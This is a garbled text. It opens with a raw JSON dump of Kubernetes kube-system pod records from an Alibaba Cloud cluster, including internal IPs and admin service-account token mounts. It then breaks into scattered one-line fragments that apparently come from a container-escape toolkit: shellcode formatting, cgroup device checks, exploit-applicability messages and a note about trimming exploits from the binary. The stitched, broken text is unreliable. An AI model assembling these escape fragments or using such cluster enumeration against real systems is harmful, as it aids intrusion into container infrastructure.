un"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-app-lifecycle-manager@sha256:37348e10cd00c02360527343a2863e7bedd2fc65c23c3f2464af5dc7efb5b2c6"",""containerID"":""docker://0913be067bdbe34a11120e12c0a65c07cdf856447b8ecf7e3f26c527aff67237"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""alicloud-disk-controller-74b658598f-rrztt"",""generateName"":""alicloud-disk-controller-74b658598f-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/alicloud-disk-controller-74b658598f-rrztt"",""uid"":""58cf7e8a-6da3-46ba-ac47-bc35e6c16eea"",""resourceVersion"":""35736431"",""creationTimestamp"":""2020-04-08T04:12:32Z"",""labels"":{""app"":""alicloud-disk-controller"",""pod-template-hash"":""74b658598f""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""alicloud-disk-controller-74b658598f"",""uid"":""1471ba59-65e2-4b9d-9259-8a657814049f"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""cloud-config"",""hostPath"":{""path"":""/etc/kubernetes/"",""type"":""""}},{""name"":""logdir"",""hostPath"":{""path"":""/var/log/alicloud/"",""type"":""""}},{""name"":""admin-token-t8m2n"",""secret"":{""secretName"":""admin-token-t8m2n"",""defaultMode"":420}}],""containers"":[{""name"":""alicloud-disk-controller"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-disk-controller:v1.14.8.37-bd3fd891-aliyun"",""resources"":{""limits"":{""cpu"":""100m"",""memory"":""100Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""cloud-config"",""mountPath"":""/etc/kubernetes/""},{""name"":""logdir"",""mountPath"":""/var/log/alicloud/""},{""name"":""admin-token-t8m2n"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls /alicloud-disk-controller""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""admin"",""serviceAccount"":""admin"",""nodeName"":""cn-beijing.192.168.0.150"",""securityContext"":{},""affinity"":{""nodeAffinity"":{""preferredDuringSchedulingIgnoredDuringExecution"":[{""weight"":1,""preference"":{""matchExpressions"":[{""key"":""node-role.kubernetes.io/master"",""operator"":""Exists""}]}}]}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:32Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:45Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:45Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:32Z""}],""hostIP"":""192.168.0.150"",""podIP"":""172.20.0.3"",""podIPs"":[{""ip"":""172.20.0.3""}],""startTime"":""2020-04-08T04:12:32Z"",""containerStatuses"":[{""name"":""alicloud-disk-controller"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:44Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:54Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://48004de77599d15d19b5336e01405579b922ae607c84fe4b5856884446f1f18e""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-disk-controller:v1.14.8.37-bd3fd891-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-disk-controller@sha256:498b6ef55f40282853d5b2ec24da4adba0f57ada2cebfa9e24edfe1bd9597a1a"",""containerID"":""docker://7d1bd7aa0c44eb838dae70b86857e4530fd3188aca2505d02eee995a425cc341"",""started"":true}],""qosClass"":""Guaranteed""}},{""metadata"":{""name"":""alicloud-monitor-controller-5599ddcdc7-8btss"",""generateName"":""alicloud-monitor-controller-5599ddcdc7-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/alicloud-monitor-controller-5599ddcdc7-8btss"",""uid"":""bb29477b-80e5-409c-a4ed-39dfb36a588f"",""resourceVersion"":""1965"",""creationTimestamp"":""2020-04-08T04:12:30Z"",""labels"":{""k8s-app"":""alicloud-monitor-controller"",""pod-template-hash"":""5599ddcdc7"",""task"":""monitoring""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""alicloud-monitor-controller-5599ddcdc7"",""uid"":""3aa03e33-6a94-4dba-882a-b1319315f437"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""admin-token-t8m2n"",""secret"":{""secretName"":""admin-token-t8m2n"",""defaultMode"":420}}],""containers"":[{""name"":""alicloud-monitor-controller"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-monitor-controller:v1.1.0"",""command"":[""/alicloud-monitor-controller"",""agent"",""--regionId=cn-beijing"",""--clusterId=ca3869bd4dd884799a5abbb00c5e56fc4"",""--logtostderr"",""--v=4""],""resources"":{""limits"":{""cpu"":""2"",""memory"":""4Gi""},""requests"":{""cpu"":""100m"",""memory"":""200Mi""}},""volumeMounts"":[{""name"":""admin-token-t8m2n"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ps -ef "
" grep -v grep""]},""initialDelaySeconds"":10,""timeoutSeconds"":5,""periodSeconds"":30,""successThreshold"":1,""failureThreshold"":3},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ps -ef "
" grep -v grep""]},""initialDelaySeconds"":5,""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""Always"",""securityContext"":{""runAsUser"":1000,""readOnlyRootFilesystem"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""aliyun-acr-credential-helper"",""serviceAccount"":""aliyun-acr-credential-helper"",""nodeName"":""cn-beijing.192.168.0.155"",""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:46Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:34Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:34Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:46Z""}],""hostIP"":""192.168.0.155"",""podIP"":""172.20.0.198"",""podIPs"":[{""ip"":""172.20.0.198""}],""startTime"":""2020-04-08T04:12:46Z"",""containerStatuses"":[{""name"":""aliyun-acr-credential-helper"",""state"":{""running"":{""startedAt"":""2020-04-08T04:13:20Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-acr-credential-helper:v20.03.16.0-36d5d7e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-acr-credential-helper@sha256:a82eaef4c266219538a5f470d758dfc0957bd24e81949431933a1406c47f8ef4"",""containerID"":""docker://9344a4a0b58a001fd38d2e349ce5893d4b355984227a5a2f5e144999ddec2df6"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""cloud-controller-manager-grvn8"",""generateName"":""cloud-controller-manager-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/cloud-controller-manager-grvn8"",""uid"":""d3540caa-ffc9-49ed-bac3-582d8444954c"",""resourceVersion"":""35736387"",""creationTimestamp"":""2020-04-08T04:12:31Z"",""labels"":{""app"":""cloud-controller-manager"",""controller-revision-hash"":""59bf758d55"",""pod-template-generation"":""1"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""cloud-controller-manager"",""uid"":""dcaaaa8b-d304-42a3-8ee2-2d415041c6c0"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""k8s"",""hostPath"":{""path"":""/etc/kubernetes"",""type"":""""}},{""name"":""certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""""}},{""name"":""pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""""}},{""name"":""cloud-config"",""configMap"":{""name"":""cloud-config"",""items"":[{""key"":""cloud-config.conf"",""path"":""cloud-config.conf""}],""defaultMode"":420}},{""name"":""cloud-controller-manager-token-hrbpn"",""secret"":{""secretName"":""cloud-controller-manager-token-hrbpn"",""defaultMode"":420}}],""containers"":[{""name"":""cloud-controller-manager"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""command"":[""/cloud-controller-manager"",""--kubeconfig=/etc/kubernetes/cloud-controller-manager.conf"",""--address=127.0.0.1"",""--allow-untagged-cloud=true"",""--leader-elect=true"",""--cloud-provider=alicloud"",""--use-service-account-credentials=true"",""--cloud-config=/etc/kubernetes/config/cloud-config.conf"",""--feature-gates=ServiceNodeExclusion=true"",""--route-reconciliation-period=3m"",""--configure-cloud-routes=true"",""--allocate-node-cidrs=true"",""--cluster-cidr=172.20.0.0/16""],""resources"":{""requests"":{""cpu"":""200m""}},""volumeMounts"":[{""name"":""k8s"",""mountPath"":""/etc/kubernetes/""},{""name"":""certs"",""mountPath"":""/etc/ssl/certs""},{""name"":""pki"",""mountPath"":""/etc/pki""},{""name"":""cloud-config"",""mountPath"":""/etc/kubernetes/config""},{""name"":""cloud-controller-manager-token-hrbpn"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10252,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""node-role.kubernetes.io/master"":""""},""serviceAccountName"":""cloud-controller-manager"",""serviceAccount"":""cloud-controller-manager"",""nodeName"":""cn-beijing.192.168.0.150"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.150""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priority"":0,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:39Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:39Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""}],""hostIP"":""192.168.0.150"",""podIP"":""192.168.0.150"",""podIPs"":[{""ip"":""192.168.0.150""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""cloud-controller-manager"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:38Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:44Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://3963ea096e0f6d079045ece4689f08235e82ed60db63ce6b7ed3bd39d2170458""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64@sha256:780116bf9a2ac7bfecc12e5c976200d656a702f9122502a96cacfcad7d3834f9"",""containerID"":""docker://65cd60d6c7398c72c0e56481028dcd099993f248c7cfe6a5b6efea8b03de76b5"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""cloud-controller-manager-rpc6j"",""generateName"":""cloud-controller-manager-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/cloud-controller-manager-rpc6j"",""uid"":""87535eb7-8b07-47b2-a9db-7d5b31935e45"",""resourceVersion"":""1733"",""creationTimestamp"":""2020-04-08T04:12:31Z"",""labels"":{""app"":""cloud-controller-manager"",""controller-revision-hash"":""59bf758d55"",""pod-template-generation"":""1"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""cloud-controller-manager"",""uid"":""dcaaaa8b-d304-42a3-8ee2-2d415041c6c0"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""k8s"",""hostPath"":{""path"":""/etc/kubernetes"",""type"":""""}},{""name"":""certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""""}},{""name"":""pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""""}},{""name"":""cloud-config"",""configMap"":{""name"":""cloud-config"",""items"":[{""key"":""cloud-config.conf"",""path"":""cloud-config.conf""}],""defaultMode"":420}},{""name"":""cloud-controller-manager-token-hrbpn"",""secret"":{""secretName"":""cloud-controller-manager-token-hrbpn"",""defaultMode"":420}}],""containers"":[{""name"":""cloud-controller-manager"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""command"":[""/cloud-controller-manager"",""--kubeconfig=/etc/kubernetes/cloud-controller-manager.conf"",""--address=127.0.0.1"",""--allow-untagged-cloud=true"",""--leader-elect=true"",""--cloud-provider=alicloud"",""--use-service-account-credentials=true"",""--cloud-config=/etc/kubernetes/config/cloud-config.conf"",""--feature-gates=ServiceNodeExclusion=true"",""--route-reconciliation-period=3m"",""--configure-cloud-routes=true"",""--allocate-node-cidrs=true"",""--cluster-cidr=172.20.0.0/16""],""resources"":{""requests"":{""cpu"":""200m""}},""volumeMounts"":[{""name"":""k8s"",""mountPath"":""/etc/kubernetes/""},{""name"":""certs"",""mountPath"":""/etc/ssl/certs""},{""name"":""pki"",""mountPath"":""/etc/pki""},{""name"":""cloud-config"",""mountPath"":""/etc/kubernetes/config""},{""name"":""cloud-controller-manager-token-hrbpn"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10252,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""node-role.kubernetes.io/master"":""""},""serviceAccountName"":""cloud-controller-manager"",""serviceAccount"":""cloud-controller-manager"",""nodeName"":""cn-beijing.192.168.0.152"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.152""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priority"":0,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:43Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:43Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""}],""hostIP"":""192.168.0.152"",""podIP"":""192.168.0.152"",""podIPs"":[{""ip"":""192.168.0.152""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""cloud-controller-manager"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:43Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64@sha256:780116bf9a2ac7bfecc12e5c976200d656a702f9122502a96cacfcad7d3834f9"",""containerID"":""docker://c9020e853dcded6316d05926cca0830ca4adcd5fef68b8b3d0880560b3bed34c"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""cloud-controller-manager-stdpv"",""generateName"":""cloud-controller-manager-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/cloud-controller-manager-stdpv"",""uid"":""61e7f14f-8a16-449f-9e51-c71d0e9f9e9a"",""resourceVersion"":""1748"",""creationTimestamp"":""2020-04-08T04:12:31Z"",""labels"":{""app"":""cloud-controller-manager"",""controller-revision-hash"":""59bf758d55"",""pod-template-generation"":""1"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""cloud-controller-manager"",""uid"":""dcaaaa8b-d304-42a3-8ee2-2d415041c6c0"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""k8s"",""hostPath"":{""path"":""/etc/kubernetes"",""type"":""""}},{""name"":""certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""""}},{""name"":""pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""""}},{""name"":""cloud-config"",""configMap"":{""name"":""cloud-config"",""items"":[{""key"":""cloud-config.conf"",""path"":""cloud-config.conf""}],""defaultMode"":420}},{""name"":""cloud-controller-manager-token-hrbpn"",""secret"":{""secretName"":""cloud-controller-manager-token-hrbpn"",""defaultMode"":420}}],""containers"":[{""name"":""cloud-controller-manager"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""command"":[""/cloud-controller-manager"",""--kubeconfig=/etc/kubernetes/cloud-controller-manager.conf"",""--address=127.0.0.1"",""--allow-untagged-cloud=true"",""--leader-elect=true"",""--cloud-provider=alicloud"",""--use-service-account-credentials=true"",""--cloud-config=/etc/kubernetes/config/cloud-config.conf"",""--feature-gates=ServiceNodeExclusion=true"",""--route-reconciliation-period=3m"",""--configure-cloud-routes=true"",""--allocate-node-cidrs=true"",""--cluster-cidr=172.20.0.0/16""],""resources"":{""requests"":{""cpu"":""200m""}},""volumeMounts"":[{""name"":""k8s"",""mountPath"":""/etc/kubernetes/""},{""name"":""certs"",""mountPath"":""/etc/ssl/certs""},{""name"":""pki"",""mountPath"":""/etc/pki""},{""name"":""cloud-config"",""mountPath"":""/etc/kubernetes/config""},{""name"":""cloud-controller-manager-token-hrbpn"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10252,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""node-role.kubernetes.io/master"":""""},""serviceAccountName"":""cloud-controller-manager"",""serviceAccount"":""cloud-controller-manager"",""nodeName"":""cn-beijing.192.168.0.151"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.151""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priority"":0,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:44Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:44Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""}],""hostIP"":""192.168.0.151"",""podIP"":""192.168.0.151"",""podIPs"":[{""ip"":""192.168.0.151""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""cloud-controller-manager"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:43Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64@sha256:780116bf9a2ac7bfecc12e5c976200d656a702f9122502a96cacfcad7d3834f9"",""containerID"":""docker://a3b571469d988545b50e68e9ce9e24d763f0d1ddfdcbd450379df1ba4edab4f0"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""coredns-8494d5b47-8clp4"",""generateName"":""coredns-8494d5b47-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/coredns-8494d5b47-8clp4"",""uid"":""b75d504c-7153-4083-bce2-df1b4b55b391"",""resourceVersion"":""1927"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""k8s-app"":""kube-dns"",""pod-template-hash"":""8494d5b47""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""prometheus.io/path"":""/metrics"",""prometheus.io/port"":""9153"",""prometheus.io/scrape"":""true""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""coredns-8494d5b47"",""uid"":""9a367f62-0ab7-4177-831f-96a86e042674"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""config-volume"",""configMap"":{""name"":""coredns"",""items"":[{""key"":""Corefile"",""path"":""Corefile""}],""defaultMode"":420}},{""name"":""timezone"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}},{""name"":""coredns-token-d79rf"",""secret"":{""secretName"":""coredns-token-d79rf"",""defaultMode"":420}}],""containers"":[{""name"":""coredns"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/coredns:1.6.2"",""args"":[""-conf"",""/etc/coredns/Corefile""],""ports"":[{""name"":""dns"",""containerPort"":53,""protocol"":""UDP""},{""name"":""dns-tcp"",""containerPort"":53,""protocol"":""TCP""},{""name"":""metrics"",""containerPort"":9153,""protocol"":""TCP""}],""resources"":{""limits"":{""cpu"":""2"",""memory"":""100Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""config-volume"",""readOnly"":true,""mountPath"":""/etc/coredns""},{""name"":""timezone"",""mountPath"":""/etc/localtime""},{""name"":""coredns-token-d79rf"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""httpGet"":{""path"":""/health"",""port"":8080,""scheme"":""HTTP""},""initialDelaySeconds"":60,""timeoutSeconds"":5,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":5},""readinessProbe"":{""httpGet"":{""path"":""/ready"",""port"":8181,""scheme"":""HTTP""},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_BIND_SERVICE""],""drop"":[""all""]},""privileged"":false,""readOnlyRootFilesystem"":true,""allowPrivilegeEscalation"":false}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""Default"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""coredns"",""serviceAccount"":""coredns"",""nodeName"":""cn-beijing.192.168.0.154"",""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDu2021/01/14 03:46:21 api-server response:"
" has misc available, and RDMA not work."
" head -1)"" ]"
" i.MountPoint == ""/"" {"
" info.Name() == ""devices.allow"" "
" is prepared for short life container shells such as serverless functions. We add build tags in source code and cut a few exploits to get the binary lighter. The 2MB file contains 90% of CDK functions, also you can pick up useful exploits in CDK source code to build your own lightweight binary."
" kernel version provided, check for match:"
" kernel: $KERNEL_ALL"""
" net.JoinHostPort(host, port), nil"
" or,"
" other modes"" ""Disabled"" / ""Enabled"""
" pkg version provided, check for match (TBD):"
" port == ""8001"" {"
" print('[TEST] [{}] {}'.format('Selfbuild K8s Pod', cmd_parsed))"
" programs, maps, links, BTFs and convert their IDs to file descriptors."
" required option wasn't found, exploit is not applicable"
" rm -f ""${name}_$(basename $i)"""
" rm -f ""${name}_$(basename $src_url)"""
" root %s"", header, shellcode)"
" rwm"") {"
" sed -${E} ""s,"
" sleep 300""],"
